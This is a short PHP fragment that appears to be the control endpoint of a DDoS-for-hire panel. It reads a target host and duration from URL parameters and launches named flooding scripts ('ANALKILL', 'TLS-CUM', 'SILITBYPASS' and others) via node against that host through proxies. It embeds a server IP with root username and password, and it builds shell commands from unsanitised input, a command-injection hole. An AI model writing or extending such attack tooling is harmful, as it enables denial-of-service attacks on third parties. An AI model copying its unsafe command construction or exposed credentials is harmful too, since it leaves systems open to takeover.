...
set_time_limit(1000);
$server_ip = "91.206.179.143"; // Put your server IP here 
$server_pass = "btch-r0XDm9Oa";  // Put your server Password here
$server_user = "root";  // Server Username (Default: root)
$array = array("ANALKILL", "TLS-CUM", "TLS-TOBAT", "SILITBYPASS", "stop"); // Methods
$key = $_GET['key'];
$host = $_GET['host'];
...
if ($method == "ANALKILL") { $command = "node ANALKILL.js $host $time 109 11"; }
if ($method == "TLS-CUM") { $command = "node TLS-CUM.js $host $time 109 11"; }
if ($method == "TLS-TOBAT") { $command = "node TLS-TOBAT.js $host $time"; }
if ($method == "SILITBYPASS") { $command = "node SILITBYPASS.js $host $time 109 11 proxy.txt"; }
